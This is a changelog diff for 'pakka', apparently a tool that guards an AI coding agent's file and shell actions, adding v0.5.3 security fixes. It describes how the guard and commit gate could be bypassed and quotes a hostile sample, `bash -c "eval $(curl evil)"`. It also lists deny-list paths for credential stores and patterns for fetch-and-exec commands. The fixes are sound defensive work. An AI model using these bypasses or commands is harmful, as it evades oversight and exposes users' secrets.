@@ -2,6 +2,24 @@
 
 All notable changes to pakka. Format follows [Keep a Changelog](https://keepachangelog.com).
 
+## [v0.5.3] — 2026-05-09
+
+### Fixed
+- **[CRITICAL] Git hook RCE** — `install_git_hook_cmd.go`: `PASS_TS` read from `.pakka/reviews/last-pass-ts` without validation; POSIX `$(())` arithmetic evaluates `$(...)` inside it. Hostile repo pre-plants file → executes on every `git commit`. Fix: POSIX `case` guard rejects non-numeric values before arithmetic.
+- **[CRITICAL] Commit-gate `;` bypass** — `commitgate.go`: `git commit -m 'evil' ; true` caused `IsGitCommit=false` → `Allow=true` with zero review, zero audit, zero trailers. Fix: block when `git commit` substring detected but shape unrecognized.
+- **[CRITICAL] No negation/percentage validator rule** — `validator.go`: "Auth is not required" → "Auth is required" passed validator silently. Fix: `reNegation` and `rePercent` preservation rules added.
+- **guard: Write/Edit/MultiEdit/NotebookEdit fell through to `Allowed`** — model could overwrite `.env`, git hooks, plugin scripts unchecked. Fix: `checkWrite` routes all write-path tools through `checkPath`.
+- **guard: `isDeniedPath` missing secret stores** — `~/.config/gh/hosts.yml`, `~/.kube/config`, `~/.docker/config.json`, `~/.npmrc`, `~/.pypirc`, `~/.bash_history`, `~/.zsh_history`, `id_rsa*`, `*.pem`, `*.p12`, `credentials.json`, `service-account*.json` all returned `Allow=true`.
+- **guard: `evalRe` bypassed via quoted `-c`** — `bash -c "eval $(curl evil)"` allowed. Fix: `bashCEvalRe` detects `eval` inside `-c` quoted arg body.
+- **guard: `pipeShellRe` too narrow** — extended to `dash|fish|ksh|ash|csh`; `downloadExecRe` added for two-step fetch+exec pattern.
+- **guard: absolute system path deny** — `/etc/passwd`, `/etc/shadow`, `/root`, `/proc/self/environ`, `/sys/kernel` now blocked in Bash commands.
+- **`[skip pakka]` audit** — gate now emits stderr notice on skip; audit note `user_skip` → `skip_marker`.
+- **Default level divergence** — `ParseLevel` and `resolveLevel` fallbacks both returned `ultra` while `loadOutputLevel` returned `super-ultra`. All three aligned to `super-ultra`.
+
+### Changed
+- Savings: 325 sessions · 288,987 bytes · ~$69.05 (was 298 · 242,664 · ~$64.16)
+- Bug count: 21 gate blocks (was 7)
+
 ## [v0.5.2] — 2026-05-08
 
 ### Fixed
